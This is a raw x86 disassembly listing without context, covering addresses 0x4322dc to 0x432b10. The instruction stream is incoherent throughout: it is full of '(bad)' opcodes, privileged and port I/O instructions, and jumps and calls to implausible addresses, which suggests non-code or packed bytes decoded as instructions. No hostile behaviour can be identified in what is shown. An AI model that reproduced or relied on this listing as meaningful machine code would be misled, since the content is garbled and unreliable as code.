  4322dc:	mov    esp,edi
  4322de:	or     al,0xda
  4322e0:	push   eax
  4322e1:	(bad)  
  4322e2:	jne    0x432298
  4322e4:	call   0x3b1bd3
  4322e9:	inc    ebp
  4322ea:	sar    BYTE PTR [eax],0x84
  4322ed:	in     al,dx
  4322ee:	add    bh,al
  4322f0:	add    BYTE PTR [ebp+esi*2-0x247426],bh
  4322f7:	(bad)  
  4322f8:	and    al,al
  4322fa:	fs in  eax,dx
  4322fc:	inc    DWORD PTR [ebp-0x7b]
  4322ff:	jle    0x432310
  432301:	leave  
  432302:	scas   al,BYTE PTR es:[edi]
  432303:	inc    esp
  432304:	add    BYTE PTR [ebx+ecx*4+0x55f20c10],ch
  43230b:	or     BYTE PTR [ebx-0x97717c8],0x83
  432312:	call   DWORD PTR [edi]
  432314:	shr    ah,0x84
  432317:	xchg   DWORD PTR [eax],eax
  432319:	add    DWORD PTR [eax],eax
  43231b:	add    bh,bh
  43231d:	dec    ebp
  43231e:	and    BYTE PTR [ecx-0x38],dl
  432321:	push   eax
  432322:	dec    DWORD PTR [ebx+0xfd885]
  432328:	mov    BYTE PTR [ebp+0x508bac00],cl
  43232e:	mov    WORD PTR [ecx+0x0],ss
  432331:	lea    ecx,[ebx+0x108b20d8]
  432337:	mov    WORD PTR [edx],ds
  432339:	add    BYTE PTR [edi+0xff01ff],al
  43233f:	mov    ecx,DWORD PTR [ebp-0x28]
  432342:	push   ecx
  432343:	shl    BYTE PTR [ebp+0x3a],0x8b
  432347:	inc    ebp
  432348:	in     al,0xeb
  43234a:	jno    0x4322d7
  43234c:	push   edx
  43234d:	mov    DWORD PTR [eax-0x28],edx
  432350:	mov    eax,DWORD PTR [ebp+0x20]
  432353:	je     0x4322dc
  432355:	mov    eax,DWORD PTR [ecx]
  432357:	sbb    BYTE PTR [eax],al
  432359:	pop    DWORD PTR [eax]
  43235b:	add    esi,eax
  43235d:	add    bl,al
  43235f:	adc    DWORD PTR [edi],esi
  432361:	jmp    0x8bce73b3
  432366:	sub    BYTE PTR [ebp+eax*2-0x63c4cf00],cl
  43236d:	jne    0x4322fa
  43236f:	mov    ecx,DWORD PTR [eax]
  432371:	in     al,0x75
  432373:	pop    DWORD PTR [ecx+0x5401]
  432379:	push   edx
  43237a:	inc    DWORD PTR [ebx]
  43237c:	adc    BYTE PTR [ecx+0x45721cc6],cl
  432382:	add    BYTE PTR [edi+0x9],dl
  432385:	call   DWORD PTR [esi]
  432387:	and    dl,al
  432389:	and    bh,bh
  43238b:	inc    edi
  43238d:	test   eax,edx
  43238f:	sldt   ebx
  432392:	xor    al,BYTE PTR [eax]
  432394:	pushf  
  432395:	(bad)  
  432396:	jmp    0x4323a4
  432398:	mov    eax,edi
  43239a:	or     al,0x75
  43239c:	inc    eax
  43239d:	call   0x431aa5
  4323a2:	mov    eax,eax
  4323a4:	loopne 0x43232a
  4323a6:	inc    ebp
  4323a7:	add    BYTE PTR [ebx+0x1451c00],cl
  4323ad:	mov    eax,DWORD PTR [ebp+0x20]
  4323b0:	add    edi,ecx
  4323b2:	add    BYTE PTR [eax],ch
  4323b4:	cmp    edi,0x18
  4323b7:	test   DWORD PTR [ebp+0xf],esi
  4323ba:	sbb    DWORD PTR [ecx+0x578b0020],0x20
  4323c1:	jne    0x4323c5
  4323c3:	call   0xffa21e88
  4323c8:	leave  
  4323c9:	rcr    BYTE PTR [esp+eax*4],0x55
  4323cd:	add    ah,ch
  4323cf:	add    BYTE PTR [edi-0x48fef979],dh
  4323d5:	add    BYTE PTR [edx*2+0x75ff3b57],dl
  4323dc:	inc    esp
  4323dd:	mov    ebx,DWORD PTR [eax]
  4323df:	fcom   st(2)
  4323e1:	add    BYTE PTR [edi],bl
  4323e3:	lea    ecx,[eax-0x18]
  4323e6:	(bad)  
  4323e7:	push   DWORD PTR [ecx]
  4323e9:	call   0xffb5714b
  4323ee:	mov    edx,DWORD PTR [eax+ecx*1-0x1]
  4323f2:	fstp   DWORD PTR [esi+ebx*8]
  4323f5:	push   ebp
  4323f6:	pop    ebp
  4323f7:	mov    esi,DWORD PTR [edx-0x38]
  4323fa:	add    DWORD PTR [eax],0x28
  4323fd:	mov    edi,DWORD PTR [ebx]
  4323ff:	xor    esi,DWORD PTR [edx+0x3]
  432402:	xor    esi,DWORD PTR [edi+ebx*2-0x75]
  432406:	pop    ebp
  432407:	or     al,0x4
  432409:	inc    ecx
  43240a:	push   ebp
  43240b:	(bad)  
  43240c:	in     al,dx
  43240d:	or     ah,ch
  43240f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  432410:	xbegin 0xffc89a06
  432416:	clc    
  432417:	adc    al,0x45
  432419:	div    BYTE PTR [edx]
  43241b:	or     BYTE PTR [eax+eax*1-0x7e278a39],bl
  432422:	test   DWORD PTR [ebx+0x666300f8],ebx
  432428:	add    BYTE PTR [ecx+0x66],dh
  43242b:	add    eax,DWORD PTR [ebp+0x52]
  43242e:	adc    eax,0xffffffa0
  432431:	xchg   DWORD PTR [ecx+0x4400fc01],ecx
  432437:	test   DWORD PTR [eax],eax
  432439:	clc    
  43243a:	data16 or al,BYTE PTR [ebp+0x45]
  43243e:	or     DWORD PTR [ebx-0x3d76d7e0],0xfffffff8
  432445:	rol    BYTE PTR [ebp+0x45],1
  432448:	mov    DWORD PTR [ebx+0x4d45e0ec],ecx
  43244e:	mov    DWORD PTR [ecx+0x1845c7e8],ecx
  432454:	push   ebx
  432455:	add    BYTE PTR [eax+eax*1+0x51],dl
  432459:	jge    0x43248e
  43245b:	add    BYTE PTR [esi+0x4],dl
  43245e:	jne    0x4324c5
  432460:	mov    edx,0x457200
  432465:	jmp    0x432429
  432467:	xor    edi,DWORD PTR [ebx]
  432469:	pop    edi
  43246a:	cvtdq2ps xmm7,xmm0
  43246d:	ret    0x0
  432470:	mov    ecx,DWORD PTR [ebx+0x51750ff0]
  432476:	xor    ecx,DWORD PTR [edi]
  432478:	add    eax,DWORD PTR [ecx+0x3b]
  43247b:	push   ebx
  43247c:	rdpmc  
  43247e:	out    0x8d,al
  432480:	add    BYTE PTR [eax],cl
  432482:	mov    eax,DWORD PTR [ebp-0x743e8b10]
  432488:	ret    0x450c
  43248b:	sbb    al,0x8b
  43248d:	cmp    eax,esi
  43248f:	or     cl,al
  432491:	or     al,0xc2
  432493:	pop    eax
  432494:	inc    ebp
  432495:	add    ecx,DWORD PTR [edi]
  432497:	add    esi,DWORD PTR [ebp+0x39]
  43249a:	invd   
  43249c:	jge    0x4324a8
  43249e:	mov    eax,0x478ac0
  4324a3:	cli    
  4324a4:	xor    esp,ecx
  4324a6:	mov    ebx,0x5b8ac0
  4324ab:	ret    0x33
  4324ae:	mov    eax,0x833b8b
  4324b3:	sub    BYTE PTR [ebx],al
  4324b5:	inc    ebp
  4324b6:	xor    ax,di
  4324b9:	pushf  
  4324ba:	inc    bh
  4324bc:	mov    esp,esp
  4324be:	hlt    
  4324bf:	test   DWORD PTR [ebp-0x8],esi
  4324c2:	mov    eax,DWORD PTR [ebp-0x14]
  4324c5:	xor    ecx,DWORD PTR [ebx-0x76478864]
  4324cb:	dec    edi
  4324cc:	or     BYTE PTR [eax],al
  4324ce:	jne    0x432459
  4324d0:	mov    esi,esp
  4324d2:	call   0x77a9b097
  4324d7:	inc    ebp
  4324d8:	mov    DWORD PTR [eax+0x9b4f0c],edi
  4324de:	add    BYTE PTR [ecx-0x3ffe0717],cl
  4324e4:	add    BYTE PTR [esi+0x7d],ah
  4324e7:	inc    ebp
  4324e8:	mov    bx,WORD PTR [ebp+0x8]
  4324ec:	add    DWORD PTR [ebp+0x54],0x30c008b
  4324f3:	inc    ebp
  4324f4:	mov    bx,di
  4324f7:	lock test BYTE PTR [ecx+0x7000801],bh
  4324fe:	jge    0x4324c1
  432500:	mov    ecx,DWORD PTR [ebx-0x640613f0]
  432506:	cli    
  432507:	xor    bl,bh
  432509:	add    ecx,DWORD PTR [ebx-0x740ff3a9]
  43250f:	test   BYTE PTR [eax],cl
  432511:	add    DWORD PTR [eax+eax*1-0x74ffbb00],eax
  432518:	cmp    ebp,eax
  43251a:	xadd   DWORD PTR [ebp+0x66f000c2],ecx
  432521:	test   BYTE PTR [ebp+0x1],bh
  432524:	mov    ebx,0x458a00
  432529:	xor    esi,DWORD PTR [ebx]
  43252b:	add    esp,DWORD PTR [esi-0x77]
  43252e:	pop    ebp
  43252f:	loopne 0x432597
  432531:	inc    ebp
  432532:	clc    
  432533:	xor    edi,DWORD PTR [ebx]
  432535:	add    esi,DWORD PTR [edx-0x77]
  432538:	data16 fdivr QWORD PTR [ebp-0x49]
  43253c:	mov    ebx,0xb78afc
  432541:	hlt    
  432542:	xor    edi,DWORD PTR [esi+eiz*2]
  432545:	add    BYTE PTR [ebp+0x66],bl
  432548:	data16 lock clc 
  43254b:	cmp    al,0x3b
  43254d:	add    BYTE PTR [edi+0x66],dh
  432550:	psubq  mm7,QWORD PTR [ebp+0x2]
  432554:	ltr    WORD PTR [ebp+0x66]
  432558:	add    esi,eax
  43255a:	add    di,WORD PTR [ebp+0x2b]
  43255e:	data16 data16 jge 0x4325df
  432562:	mov    ebx,0xe08a8b
  432567:	jge    0x43259c
  432569:	data16 data16 xor al,0x5d
  43256d:	data16 data16 jne 0x432569
  432571:	mov    edi,DWORD PTR [ebx]
  432573:	fdiv   QWORD PTR [edx+0x7d]
  432576:	data16 data16 jge 0x4325ae
  43257a:	mov    ebx,0x758a66
  43257f:	mov    esi,0x667233
  432584:	pop    ebp
  432585:	or     BYTE PTR [esi+0x0],ah
  432588:	clc    
  432589:	mov    edi,DWORD PTR [ebx]
  43258b:	lock ja 0x432519
  43258e:	(bad)  
  432590:	jge    0x432589
  432592:	invd   
  432594:	pop    ebp
  432595:	add    BYTE PTR [ebx],al
  432597:	(bad)  
  432598:	cmp    di,WORD PTR [ebp+0xf]
  43259c:	data16 sbb bh,BYTE PTR [ebp+0x0]
  4325a0:	mov    bx,WORD PTR [ebp-0x10]
  4325a4:	pop    bp
  4325a6:	fbstp  TBYTE PTR [ebx]
  4325a8:	test   DWORD PTR [ebx],eax
  4325aa:	add    BYTE PTR [ebx],bh
  4325ac:	add    BYTE PTR [esi+0x7d],ah
  4325af:	jge    0x43253c
  4325b1:	data16 in al,dx
  4325b3:	pop    ebp
  4325b4:	stc    
  4325b5:	bsf    ecx,DWORD PTR [ebp+0x6632009b]
  4325bc:	mov    edi,ebx
  4325be:	in     al,dx
  4325bf:	test   BYTE PTR [ebp+0x0],bh
  4325c2:	mov    eax,DWORD PTR [eax]
  4325c4:	call   0xbd401f54
  4325c9:	cmp    al,0x9b
  4325cb:	add    BYTE PTR [edx],dh
  4325cd:	mov    bx,di
  4325d0:	call   0x8b4ba360
  4325d5:	add    ebp,esp
  4325d7:	mov    bx,di
  4325da:	jnp    0x432602
  4325dc:	mov    DWORD PTR [ebx+0x3c7df808],ecx
  4325e2:	mov    eax,DWORD PTR [eax]
  4325e4:	call   0x7c3eb14f
  4325e9:	mov    ecx,DWORD PTR [ecx+0x7d030c08]
  4325ef:	data16 data16 fistp WORD PTR [ebp+0xe]
  4325f4:	xor    DWORD PTR [edi-0x48fff7ac],0xfb66f403
  4325fe:	fisttp WORD PTR [ecx-0x7401f77b]
  432604:	(bad)  
  432605:	cld    
  432606:	jne    0x432644
  432608:	xor    eax,DWORD PTR [eax]
  43260a:	mov    esp,DWORD PTR [esi-0x10]
  43260d:	sti    
  43260e:	repnz mov ebp,DWORD PTR [edi-0xffc76f4]
  432615:	data16 adc bl,bh
  432618:	push   ebp
  432619:	xor    ecx,DWORD PTR es:[ebx+0x3ce4f88b]
  432620:	mov    WORD PTR [eax],es
  432622:	fwait
  432623:	data16 xor bh,bl
  432626:	mov    DWORD PTR [ebx+0x3550ce4],ecx
  43262c:	mov    esp,DWORD PTR [esi-0x14]
  43262f:	fisttp WORD PTR [ebx-0x3748a9f2]
  432635:	or     al,0x2b
  432637:	mov    bh,0xba
  432639:	hlt    
  43263a:	mov    bh,bl
  43263c:	add    BYTE PTR [ecx-0x7446f3cd],cl
  432642:	dec    esi
  432643:	or     al,0x0
  432645:	mov    edi,DWORD PTR [ebx]
  432647:	or     BYTE PTR [ebp+0x3b],dh
  43264a:	mov    ecx,DWORD PTR [edi]
  43264c:	fdivr  QWORD PTR [ebx-0x7499ff83]
  432652:	xor    al,0xd8
  432654:	pop    bp
  432656:	lock xor esi,DWORD PTR [ebx]
  432659:	lea    esp,[esi+0x1f]
  43265c:	icebp  
  43265d:	jb     0x432663
  43265f:	add    al,al
  432661:	jge    0x43266f
  432663:	mov    eax,eax
  432665:	fsubr  st,st(3)
  432667:	pop    ebp
  432668:	mov    esi,DWORD PTR [ebx]
  43266a:	in     al,0x8d
  43266c:	rcr    DWORD PTR [edi],0xc2
  43266f:	jb     0x4326cf
  432671:	add    cl,cl
  432673:	jge    0x432681
  432675:	mov    edx,DWORD PTR [ebp-0x20]
  432678:	in     al,dx
  432679:	pop    ebp
  43267a:	data16 data16 or BYTE PTR [esi+edi*4],bh
  43267f:	cmp    di,WORD PTR [ebp+0x0]
  432683:	mov    ebp,DWORD PTR [ebx]
  432685:	fdivr  QWORD PTR [esi+0x668a5d]
  43268b:	cmp    al,0x33
  43268d:	mov    si,0x4e7d
  432691:	mov    eax,DWORD PTR [eax]
  432693:	lock inc ebp
  432695:	mov    esi,DWORD PTR [eax]
  432697:	or     BYTE PTR [edi+esi*8+0x8508ba],bl
  43269e:	clc    
  43269f:	(bad)  
  4326a0:	cmp    edi,DWORD PTR [ebx]
  4326a2:	je     0x4326b3
  4326a4:	push   ebx
  4326a5:	loopne 0x4326b6
  4326a7:	dec    ecx
  4326a9:	mov    esp,DWORD PTR [ebp-0x1c]
  4326ac:	int    0xf1
  4326ae:	mov    esi,0x703084d
  4326b3:	pcmpgtd mm6,mm1
  4326b6:	add    BYTE PTR [ebp+0x66],dh
  4326b9:	jmp    0x432686
  4326bb:	mov    eax,DWORD PTR [ebx]
  4326bd:	lock push ebp
  4326bf:	ror    DWORD PTR [ebp-0x2972feb3],1
  4326c5:	or     bh,dl
  4326c7:	jb     0x4326c7
  4326c9:	add    BYTE PTR [ebx-0x1a7487b3],cl
  4326cf:	loopne 0x4326d1
  4326d1:	jne    0x4326d5
  4326d3:	data16 add BYTE PTR [esi+eiz*2],dh
  4326d7:	mov    ecx,ebx
  4326d9:	data16 cmp al,0xf1
  4326dc:	add    BYTE PTR [esi+eiz*2],bh
  4326df:	add    bl,cl
  4326e1:	retw   0xf2
  4326e5:	ret    0x66
  4326e8:	retf   
  4326e9:	enterw 0x4df1,0x19
  4326ee:	pop    edi
  4326ef:	jne    0x432672
  4326f1:	mov    esi,DWORD PTR [eax]
  4326f3:	call   0x77b7b294
  4326f8:	xor    ebp,DWORD PTR [ebx]
  4326fa:	lea    esp,[esi+0x48]
  4326fd:	repnz in eax,0x3b
  432700:	add    BYTE PTR [ebp-0x37],dh
  432703:	xor    edx,DWORD PTR [ebp-0x15]
  432706:	in     al,dx
  432707:	xor    edx,DWORD PTR [esi+0x40]
  43270a:	mov    DWORD PTR [edi],0x338545fc
  432710:	clc    
  432711:	add    esi,DWORD PTR [ecx]
  432713:	pop    edi
  432714:	pushf  
  432715:	pop    ebx
  432716:	call   0xff4426dd
  43271b:	mov    edi,eax
  43271d:	push   ecx
  43271e:	pop    es
  43271f:	mov    edi,DWORD PTR [eax]
  432721:	push   esi
  432722:	inc    esi
  432723:	add    bh,BYTE PTR [esi+0x0]
  432726:	popa   
  432727:	data16 (bad) 
  432729:	into   
  43272a:	gs cmp al,0xcd
  43272d:	add    BYTE PTR [ecx+0x7ce0866],bh
  432733:	ret    0x66
  432736:	add    bh,al
  432738:	add    bh,ah
  43273a:	add    BYTE PTR [ebp+0x31c3f866],al
  432740:	cmp    al,0x9c
  432742:	add    BYTE PTR [esi+0x66],ah
  432745:	into   
  432746:	ret    
  432747:	pop    ebp
  432748:	adc    BYTE PTR [edi+0x0],dl
  43274b:	mov    bh,0x66
  43274d:	mov    edi,0xff038dc3
  432752:	jne    0x4327a8
  432754:	lea    edx,[ecx+0x1]
  432757:	mov    ebx,0xd64ff1
  43275c:	sar    DWORD PTR [ebx],1
  43275e:	test   BYTE PTR [ebp+0x36],dh
  432761:	mov    DWORD PTR [esp+edi*8-0x76],esp
  432765:	push   edi
  432766:	xor    BYTE PTR [ebx],0x38
  432769:	mov    esi,ebx
  43276b:	xor    eax,DWORD PTR [eax-0x3c73819a]
  432771:	ss inc ebp
  432773:	fs pop ebx
  432775:	mov    ebx,0x9c3b30
  43277a:	je     0x4327a7
  43277c:	xor    edi,DWORD PTR [ebx+0x668a33]
  432782:	mov    WORD PTR [ebx],?
  432784:	ss mov ebx,0x8b4e64
  43278a:	pop    edi
  43278b:	cmp    ecx,ecx
  43278d:	jne    0x4327e4
  43278f:	mov    ebp,esp
  432791:	cld    
  432792:	push   esi
  432793:	pop    ebx
  432794:	inc    ebp
  432795:	stc    
  432796:	xor    BYTE PTR [ebp+0x9bef89c],al
  43279c:	test   esi,ecx
  43279e:	clc    
  43279f:	test   dl,dl
  4327a1:	cmp    bh,bh
  4327a3:	fs pop si
  4327a6:	or     bl,al
  4327a8:	add    cl,BYTE PTR [ebx+0x57665100]
  4327ae:	retf   0x3c45
  4327b1:	xor    BYTE PTR [eax],al
  4327b3:	pushf  
  4327b4:	mov    si,0x85ca
  4327b8:	ret    0xf8
  4327bb:	pop    ebx
  4327bc:	dec    dx
  4327bf:	mov    edx,DWORD PTR [edi-0x76]
  4327c2:	push   edi
  4327c3:	add    al,0xb7
  4327c5:	xor    al,0xba
  4327c7:	cmp    al,0x8d
  4327c9:	je     0x4327ca
  4327cb:	mov    edx,DWORD PTR [edx+edi*4+0x51]
  4327cf:	lea    edi,[ebx+0x544fff]
  4327d5:	push   ecx
  4327d6:	cmp    edx,DWORD PTR [ebx+0x75]
  4327d9:	mov    ecx,DWORD PTR [ecx+0x723bfcbb]
  4327df:	add    BYTE PTR [ebx],dh
  4327e1:	sub    ecx,DWORD PTR [ebx+0x668a33bb]
  4327e7:	add    BYTE PTR [ebx+esi*1+0x4f64bb36],cl
  4327ee:	mov    ebx,0x3b3b00
  4327f3:	jne    0x432820
  4327f5:	mov    DWORD PTR [ebx+0x728afc],edi
  4327fb:	xor    esi,DWORD PTR [ebx]
  4327fd:	mov    edi,DWORD PTR [ebx+0x8d4e33]
  432803:	push   edi
  432804:	cmp    esp,ebp
  432806:	jne    0x432808
  432808:	sbb    DWORD PTR [eax],0x8085c3fc
  43280e:	clc    
  43280f:	inc    esi
  432810:	pop    ebx
  432811:	sti    
  432812:	add    eax,0xeb8bc075
  432817:	cld    
  432818:	xor    edi,DWORD PTR ds:0xf8c3855e
  43281e:	mov    ecx,DWORD PTR [ecx+edx*2]
  432821:	rol    DWORD PTR [ebp-0x37],0xf
  432825:	mov    DWORD PTR [eax],ecx
  432827:	inc    edi
  432828:	(bad)  
  432829:	in     eax,0xfe
  43282b:	add    bh,bh
  43282d:	(bad)  
  43282e:	mov    esi,0xc38a5e
  432833:	mov    esi,DWORD PTR [ebx]
  432835:	push   ecx
  432836:	mov    edi,0xfc4ec7
  43283b:	test   DWORD PTR [ebp-0x8],edx
  43283e:	xor    di,ax
  432841:	pushf  
  432842:	sub    ebp,eax
  432844:	inc    ebp
  432845:	(bad)  
  432846:	sub    edi,edi
  432848:	mov    DWORD PTR [ebx+0x3b03ba08],ecx
  43284e:	inc    ebp
  43284f:	add    BYTE PTR [esi+0x2b],ah
  432852:	or     bh,BYTE PTR [edx+0xf8ac2]
  432858:	cmp    al,0x33
  43285a:	mov    edi,DWORD PTR [edx+0xfe4e81]
  432860:	(bad)  
  432861:	cmp    esi,DWORD PTR [ebx]
  432863:	je     0x43281d
  432865:	push   ebx
  432866:	dec    esi
  432867:	str    ecx
  43286a:	cmp    esp,DWORD PTR [ebp+0x75]
  43286d:	int    0x33
  43286f:	mov    edi,0x789085f
  432874:	mov    edx,DWORD PTR [eax]
  432876:	cld    
  432877:	add    cl,cl
  432879:	data16 add al,0xcb
  43287c:	push   ebp
  43287d:	add    ebp,esp
  43287f:	jne    0x43286d
  432881:	(bad)  
  432882:	mov    DWORD PTR [ecx],0xd685f7ec
  432888:	clc    
  432889:	xlat   BYTE PTR ds:[ebx]
  43288a:	inc    ebp
  43288b:	mov    esi,DWORD PTR [edx]
  43288d:	push   eax
  43288e:	pushf  
  43288f:	in     eax,0x8b
  432891:	add    ah,ch
  432893:	add    dl,BYTE PTR [eax+eax*1+0x51]
  432897:	add    ax,0x72cb
  43289b:	cmp    al,0x0
  43289d:	add    BYTE PTR [ebp+0x66],al
  4328a0:	(bad)  
  4328a1:	retf   
  4328a2:	lock ret 0x85
  4328a6:	clc    
  4328a7:	inc    bp
  4328a9:	retf   
  4328aa:	cmp    eax,0xc77d9cc8
  4328af:	xor    ah,bh
  4328b1:	pushf  
  4328b2:	test   DWORD PTR [edi-0x8],ebx
  4328b5:	je     0x4328fc
  4328b7:	xor    esi,DWORD PTR ds:0x7020840
  4328bd:	ror    BYTE PTR [ebp-0x37],0x8d
  4328c1:	push   ebp
  4328c2:	add    esp,ebp
  4328c4:	jb     0x432851
  4328c6:	add    BYTE PTR [eax],cl
  4328c8:	dec    ebp
  4328c9:	mov    bh,0x81
  4328cb:	push   esi
  4328cc:	push   esp
  4328cd:	adc    DWORD PTR [ecx-0x3c],0x3c9bff81
  4328d4:	xor    al,BYTE PTR [eax]
  4328d6:	mov    edx,DWORD PTR [edi+0x10]
  4328d9:	(bad)  
  4328da:	scas   eax,DWORD PTR es:[edi]
  4328db:	ret    0x3b
  4328de:	jns    0x3b4425d1
  4328e4:	mov    esi,DWORD PTR [eax+edx*1-0x75]
  4328e8:	dec    ebp
  4328e9:	or     BYTE PTR [ebx],ch
  4328eb:	ret    0x458b
  4328ee:	lock jmp 0x4328e2
  4328f1:	mov    ecx,DWORD PTR [eax]
  4328f3:	or     BYTE PTR [edi],al
  4328f5:	mov    ecx,eax
  4328f7:	xor    DWORD PTR [edx+0x2],0x0
  4328fb:	mov    bh,0xc1
  4328fd:	adc    BYTE PTR [eax],dh
  4328ff:	iret   
  432900:	inc    ebp
  432901:	mov    DWORD PTR [ebx],0x4dfff8c4
  432907:	inc    BYTE PTR [ebx]
  432909:	ret    0xf8
  43290c:	adc    DWORD PTR [esi+0x10],esp
  43290f:	clc    
  432910:	dec    ecx
  432911:	fisttp WORD PTR [ecx+0x456604c0]
  432917:	add    dh,BYTE PTR ds:0x75e0845
  43291d:	ret    0x4d
  432920:	lea    ecx,[ebx+0x18728301]
  432926:	add    BYTE PTR [ebp+0x45],al
  432929:	xor    ecx,ebp
  43292b:	pushf  
  43292c:	add    bh,al
  43292e:	add    al,ch
  432930:	inc    ebp
  432931:	test   DWORD PTR [ebx-0x3eba0708],ecx
  432937:	xor    eax,0x781084d
  43293c:	push   esp
  43293d:	fwait
  43293e:	push   ecx
  43293f:	xor    al,BYTE PTR [ecx+0x32f89b89]
  432945:	inc    ebp
  432946:	cmp    edi,DWORD PTR [ecx]
  432948:	jbe    0x4328e6
  43294a:	mov    eax,edi
  43294c:	or     ah,dh
  43294e:	inc    ebp
  43294f:	test   DWORD PTR [ebx+0x4d450cf8],ecx
  432955:	xor    ecx,DWORD PTR [ebx-0x74747664]
  43295b:	in     al,dx
  43295c:	hlt    
  43295d:	push   esp
  43295e:	push   esp
  43295f:	push   ecx
  432960:	push   ecx
  432961:	mov    ecx,DWORD PTR [ebx-0x7b7b0708]
  432967:	fwait
  432968:	fwait
  432969:	xor    dh,BYTE PTR [edx]
  43296b:	mov    ecx,DWORD PTR [ecx+0x5bf1f8e8]
  432971:	or     BYTE PTR [ebp+0x7],al
  432974:	mov    eax,ecx
  432976:	clc    
  432977:	jb     0x43293a
  432979:	add    BYTE PTR [ebp+0x55],cl
  43297c:	or     DWORD PTR [edi],0xc251d154
  432982:	add    DWORD PTR [ebx+0x32009b],0x8b76453b
  43298c:	mov    edi,eax
  43298e:	or     cl,al
  432990:	inc    ebp
  432991:	dec    ebp
  432992:	mov    eax,DWORD PTR [ecx+0x514d540c]
  432998:	or     WORD PTR [ecx],0x899b
  43299d:	xor    cl,BYTE PTR [ebx+0x5476fc3b]
  4329a3:	mov    edx,DWORD PTR [ecx+0x8]
  4329a6:	mov    eax,DWORD PTR [ebp-0x8]
  4329a9:	mov    eax,DWORD PTR [esp+ecx*1-0x74cdb265]
  4329b0:	mov    DWORD PTR [ecx+0x4178bf8],ecx
  4329b6:	inc    ebp
  4329b7:	dec    eax
  4329b8:	add    ecx,DWORD PTR [ebx+0x544df0f8]
  4329be:	add    edx,DWORD PTR [ecx-0x8]
  4329c1:	mov    ecx,DWORD PTR [ecx]
  4329c3:	clc    
  4329c4:	or     BYTE PTR [ebp+eax*2+0x4532409b],al
  4329cb:	mov    ecx,ebp
  4329cd:	clc    
  4329ce:	(bad)  
  4329cf:	popf   
  4329d0:	inc    DWORD PTR [eax]
  4329d2:	ret    0x8b
  4329d5:	adc    BYTE PTR [ebx-0x38d4aeb3],cl
  4329db:	mov    edi,esp
  4329dd:	hlt    
  4329de:	test   ecx,esi
  4329e0:	clc    
  4329e1:	or     BYTE PTR [ebp+0x7],al
  4329e4:	xor    al,cl
  4329e6:	pushf  
  4329e7:	jb     0x432a1c
  4329e9:	add    BYTE PTR [eax-0x3f],al
  4329ec:	inc    eax
  4329ed:	daa    
  4329ee:	inc    ebp
  4329ef:	inc    ebp
  4329f0:	xor    eax,0x7f80803
  4329f5:	dec    ebp
  4329f6:	fwait
  4329f7:	add    esi,DWORD PTR [edx]
  4329f9:	clc    
  4329fa:	cmp    DWORD PTR [ecx],ecx
  4329fc:	or     al,0x8
  4329fe:	add    al,BYTE PTR [ebp+0x2c]
  432a01:	xor    eax,0x7350845
  432a06:	or     BYTE PTR [ebp+0x7],cl
  432a09:	lea    ebx,[ebx-0x748dcdff]
  432a0f:	add    BYTE PTR [eax*2-0x74b21438],cl
  432a16:	mov    edx,DWORD PTR [eax]
  432a18:	cld    
  432a19:	dec    ebp
  432a1a:	push   esp
  432a1b:	sub    edx,DWORD PTR [ecx-0x75]
  432a1e:	add    eax,0xf172fc
  432a23:	or     BYTE PTR [ebp+0x7],cl
  432a26:	add    eax,ecx
  432a28:	or     al,0x72
  432a2a:	add    DWORD PTR [eax],eax
  432a2c:	mov    ebx,0x29c2c1
  432a31:	inc    ebp
  432a32:	mov    eax,DWORD PTR [ebx]
  432a34:	cmp    eax,0x3004d1c
  432a3a:	xbegin 0x66c8b634
  432a40:	clc    
  432a41:	or     BYTE PTR [ebp+0x45],al
  432a44:	xor    dh,BYTE PTR ds:0x78b089c
  432a4a:	adc    BYTE PTR [ebp+0x45],cl
  432a4d:	lea    eax,[ebp+0x33727501]
  432a53:	add    cl,ch
  432a55:	inc    ebp
  432a56:	add    bl,ch
  432a58:	add    BYTE PTR [ebx+0x45850845],cl
  432a5e:	je     0x4329eb
  432a60:	push   ebx
  432a61:	or     al,0x85
  432a63:	dec    ebp
  432a64:	std    
  432a65:	mov    bh,bh
  432a67:	mov    BYTE PTR [ebp-0x75],al
  432a6a:	mov    edi,eax
  432a6c:	or     al,0x89
  432a6e:	inc    ebp
  432a6f:	clc    
  432a70:	mov    esp,esp
  432a72:	hlt    
  432a73:	call   DWORD PTR [edi-0x37]
  432a76:	push   esp
  432a77:	or     al,0x51
  432a79:	push   ebp
  432a7a:	xor    ebp,esp
  432a7c:	mov    esi,0x457251
  432a81:	xor    esi,eax
  432a83:	pushf  
  432a84:	inc    ebp
  432a85:	(bad)  
  432a86:	mov    edi,eax
  432a88:	or     al,0x85
  432a8a:	add    al,bh
  432a8c:	inc    eax
  432a8e:	mov    esi,DWORD PTR [ebx+ecx*4-0x75]
  432a92:	or     ah,bh
  432a94:	inc    eax
  432a95:	push   esp
  432a96:	jmp    0x432ae9
  432a98:	mov    eax,DWORD PTR ds:0xe8720c
  432a9e:	mov    DWORD PTR [ebp-0x8],eax
  432aa1:	jne    0x432ae8
  432aa3:	jmp    0x432a30
  432aa5:	mov    ebp,DWORD PTR [eax]
  432aa7:	clc    
  432aa8:	retf   0xff54
  432aab:	push   ecx
  432aac:	mov    DWORD PTR ds:0x757210,eax
  432ab2:	mov    ecx,DWORD PTR [ebp-0x4]
  432ab5:	sub    esp,DWORD PTR [ebx-0x77]
  432ab8:	dec    DWORD PTR [eax*4-0x74ca8abb]
  432abf:	or     ah,bh
  432ac1:	pop    es
  432ac2:	ds fwait
  432ac4:	push   DWORD PTR [edx]
  432ac6:	mov    ecx,DWORD PTR [ebx+0x4dc708f0]
  432acc:	(bad)  
  432acd:	mov    bh,bh
  432acf:	jmp    0x432abd
  432ad1:	leave  
  432ad2:	jne    0x432adc
  432ad4:	call   0x30242e
  432ad9:	in     al,dx
  432ada:	dec    ebp
  432adb:	add    dh,BYTE PTR [ebx]
  432add:	add    BYTE PTR [ebx],al
  432adf:	inc    ebp
  432ae0:	cmp    esi,DWORD PTR [ecx]
  432ae2:	je     0x432a80
  432ae4:	mov    eax,edi
  432ae6:	or     al,0xf0
  432ae8:	add    BYTE PTR [ebp+0x458bf845],al
  432aee:	or     BYTE PTR [ebx-0x3f7cf7b3],cl
  432af4:	adc    al,0x7
  432af6:	enter  0x9fc0,0xa5
  432afa:	rol    BYTE PTR [eax],0x5e
  432afd:	mov    ecx,ecx
  432aff:	or     al,0xc
  432b01:	ror    BYTE PTR [ebx+0x408df8f2],0xe4
  432b08:	jmp    0x432b09
  432b0a:	push   ebp
  432b0b:	mov    esp,ebp
  432b0d:	cld    
  432b0e:	inc    ebp
  432b0f:	inc    ebp
  432b10:	or     DWORD PTR [ecx+0x457dec10],0x0
